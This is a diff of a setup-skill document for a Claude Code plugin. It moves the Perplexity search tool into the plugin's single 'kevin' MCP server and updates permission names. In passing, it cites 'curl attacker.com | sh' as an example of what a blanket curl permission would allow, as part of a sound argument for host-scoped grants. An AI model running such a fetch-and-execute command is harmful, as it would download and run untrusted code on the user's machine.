@@ -69,7 +69,7 @@ If nothing is ticked, cancel and return to Step 1. Otherwise run the matching su
 
 ### A.2a — SEO pack walk
 
-**Tool-name prefix convention** — important: the plugin bundles two MCP servers (`kevin` and `perplexity`), so all their tools use the **plugin-namespaced** prefix `mcp__plugin_agent-kevin_<server>__<tool>` (e.g., `mcp__plugin_agent-kevin_kevin__serpapi_search`, `mcp__plugin_agent-kevin_perplexity__perplexity_search`). The shorter `mcp__kevin__<tool>` or `mcp__perplexity__<tool>` forms look correct but won't match anything at runtime — Claude Code prefixes plugin-provided servers with `plugin_<plugin-name>_<server-name>`. Tools from servers registered in `<HOME>/.mcp.json` (none required by Kevin's first-party packs) would use the plain `mcp__<server>__<tool>` form. The "Permissions to grant" column below uses the correct form for each.
+**Tool-name prefix convention** — important: the plugin bundles a single MCP server (`kevin`), so all its tools use the **plugin-namespaced** prefix `mcp__plugin_agent-kevin_kevin__<tool>` (e.g., `mcp__plugin_agent-kevin_kevin__serpapi_search`, `mcp__plugin_agent-kevin_kevin__perplexity_search`). The shorter `mcp__kevin__<tool>` form looks correct but won't match anything at runtime — Claude Code prefixes plugin-provided servers with `plugin_<plugin-name>_<server-name>`. Tools from servers registered in `<HOME>/.mcp.json` (none required by Kevin's first-party packs) would use the plain `mcp__<server>__<tool>` form. The "Permissions to grant" column below uses the correct form for each.
 
 | Skill | Backed by | Required key(s) | Extra permission to grant |
 |---|---|---|---|
@@ -80,7 +80,7 @@ If nothing is ticked, cancel and return to Step 1. Otherwise run the matching su
 | `wordpress-rest` | direct `curl` | none | `Bash(curl https://<host>/*)` + `Bash(curl * https://<host>/*)`, where `<host>` is derived from `GSC_SITE_URL`. Only granted if `google-search-console` was configured this run (so `GSC_SITE_URL` is set). Otherwise curl confirms per-call. |
 | `google-search-audit` | composite (uses tools above) | shares the keys above | _already granted by `/init`_ |
 
-**Plugin-bundled MCP tools are pre-granted by `/agent-kevin:init`** — that flow writes all `mcp__plugin_agent-kevin_*` entries (both `_kevin__*` and `_perplexity__*`) into `$PROJECT_SETTINGS` → `permissions.allow` at scaffold time. This skill only handles non-plugin configuration: API keys for the bundled servers (`SERPAPI_KEY`, `OPENPAGERANK_API_KEY`, `GSC_SITE_URL`, `PERPLEXITY_API_KEY`), Google OAuth flow for GSC/PSI, and **host-scoped** curl grants for `wordpress-rest` (derived from `GSC_SITE_URL` so they're locked to the user's actual site, not blanket `Bash(curl *)` which would authorise arbitrary network requests like `curl attacker.com | sh`).
+**Plugin-bundled MCP tools are pre-granted by `/agent-kevin:init`** — that flow writes all `mcp__plugin_agent-kevin_kevin__*` entries into `$PROJECT_SETTINGS` → `permissions.allow` at scaffold time. This skill only handles non-plugin configuration: API keys consumed by `kevin` tools (`SERPAPI_KEY`, `OPENPAGERANK_API_KEY`, `GSC_SITE_URL`, `PERPLEXITY_API_KEY`), Google OAuth flow for GSC/PSI, and **host-scoped** curl grants for `wordpress-rest` (derived from `GSC_SITE_URL` so they're locked to the user's actual site, not blanket `Bash(curl *)` which would authorise arbitrary network requests like `curl attacker.com | sh`).
 
 Walk the 4 skills that *need keys* one at a time (`serpapi`, `open-page-rank`, `google-search-console`, `google-page-speed`). For each, `AskUserQuestion`:
 
@@ -135,19 +135,19 @@ Permissions granted: <count> entries in .claude/settings.json
 
 ### A.2b — Browser pack walk
 
-The Browser pack is one piece of configuration: the **Perplexity API key**. The Perplexity MCP server is plugin-bundled (registered in the plugin's own `.mcp.json` as the `perplexity` server, surfacing as `mcp__plugin_agent-kevin_perplexity__perplexity_search`), so it auto-loads on every session — but it stays inert until `PERPLEXITY_API_KEY` lands in the env block of `$SETTINGS_FILE`. Tool permission was pre-granted by `/init`. (Playwright tools are part of the plugin's own MCP and already grant-able via permissions.)
+The Browser pack is one piece of configuration: the **Perplexity API key**. `perplexity_search` is a native `kevin` MCP tool that calls the Perplexity Search API directly — it loads on every session but stays inert until `PERPLEXITY_API_KEY` lands in the env block of `$SETTINGS_FILE`. Tool permission was pre-granted by `/init`. (Playwright tools are part of the same MCP and already grant-able via permissions.)
 
-**(1) Perplexity** — `mcp__plugin_agent-kevin_perplexity__perplexity_search`.
+**(1) Perplexity** — `mcp__plugin_agent-kevin_kevin__perplexity_search`.
 
 `AskUserQuestion`:
 
 > **Set Perplexity API key?**
-> Sign up at https://perplexity.ai/settings/api for an API key. The MCP server is already wired into the plugin and granted permissions by `/init` — this step just provides the key so calls actually succeed.
+> Sign up at https://perplexity.ai/settings/api for an API key. The `perplexity_search` tool is already wired into the `kevin` MCP and granted permissions by `/init` — this step just provides the key so calls actually succeed.
 >
 > - Yes, provide the key now
 > - Skip (server stays inert until you set `PERPLEXITY_API_KEY` later)
 
-If installing: write `PERPLEXITY_API_KEY=<value>` into `$SETTINGS_FILE` env block (§D). **Do not** touch `$MCP_FILE` — perplexity is plugin-bundled, not project-registered.
+If installing: write `PERPLEXITY_API_KEY=<value>` into `$SETTINGS_FILE` env block (§D). **Do not** touch `$MCP_FILE` — `perplexity_search` lives inside the `kevin` MCP server, not a separate project-registered server.
 
 **(2) Playwright** — `mcp__plugin_agent-kevin_kevin__playwright_{screenshot,pdf,record}` tools.
 
@@ -268,7 +268,7 @@ Print per library: install status + symlink path + upstream LICENSE first-line. 
 
 **Browser deconfigure:**
 - `AskUserQuestion`: "Remove `PERPLEXITY_API_KEY` from `$SETTINGS_FILE`?" (Yes/No). If yes, delete via §D.
-- Do **not** touch `$MCP_FILE` and do **not** revoke `mcp__plugin_agent-kevin_perplexity__perplexity_search` — both are plugin baseline (registration via the plugin's own `.mcp.json`, permission written by `/init`). The server stays loaded but inert without the key, which is what "deconfigured" means here.
+- Do **not** touch `$MCP_FILE` and do **not** revoke `mcp__plugin_agent-kevin_kevin__perplexity_search` — both are plugin baseline (tool lives in the `kevin` MCP server, permission written by `/init`). The tool stays loaded but inert without the key, which is what "deconfigured" means here.
 - Remind user: playwright + chromium stay installed (part of plugin base deps).
 
 Print summary of what was removed.
@@ -315,7 +315,7 @@ When a pack/skill is configured, write its tools into `$PROJECT_SETTINGS` → `p
 4. Sort `permissions.allow` alphabetically (deterministic diffs).
 5. Write back with 2-space indent.
 
-Example final shape (`/init` baseline + SEO with `GSC_SITE_URL=https://example.com/`). The `mcp__plugin_agent-kevin_*` entries (including `mcp__plugin_agent-kevin_perplexity__perplexity_search` since perplexity is plugin-bundled) and the read-mostly Bash patterns are written by `/init`; this skill appends host-scoped curl (when SEO is configured). Browser configuration only touches `$SETTINGS_FILE` env (the API key) — no permissions diff here:
+Example final shape (`/init` baseline + SEO with `GSC_SITE_URL=https://example.com/`). The `mcp__plugin_agent-kevin_kevin__*` entries (including `perplexity_search`, which lives in the `kevin` MCP server) and the read-mostly Bash patterns are written by `/init`; this skill appends host-scoped curl (when SEO is configured). Browser configuration only touches `$SETTINGS_FILE` env (the API key) — no permissions diff here:
 
 ```json
 {
@@ -366,14 +366,14 @@ Example final shape (`/init` baseline + SEO with `GSC_SITE_URL=https://example.c
       "mcp__plugin_agent-kevin_kevin__task_scan",
       "mcp__plugin_agent-kevin_kevin__task_thread",
       "mcp__plugin_agent-kevin_kevin__task_update",
-      "mcp__plugin_agent-kevin_perplexity__perplexity_search"
+      "mcp__plugin_agent-kevin_kevin__perplexity_search"
     ]
   }
 }
 ```
 
 **Prefix rule** (use this whenever you need to know how a tool surfaces to permissions.allow):
-- Plugin-bundled MCP tools (from the plugin's own `.mcp.json` → any `mcpServers.<name>`): `mcp__plugin_agent-kevin_<server>__<tool>`. The plugin bundles two servers: `kevin` (the in-house MCP, 24 tools) and `perplexity` (the upstream `@perplexity-ai/mcp-server`, 1 tool). Both surface under this prefix.
+- Plugin-bundled MCP tools (from the plugin's own `.mcp.json` → any `mcpServers.<name>`): `mcp__plugin_agent-kevin_<server>__<tool>`. The plugin bundles a single server: `kevin` (25 tools, including `perplexity_search` which wraps the Perplexity Search API).
 - Standalone MCP servers registered in `<HOME>/.mcp.json` (none required by Kevin's first-party packs, but users can add their own): `mcp__<server>__<tool>`
 
 **Revoke** (remove entries — deconfigure path):
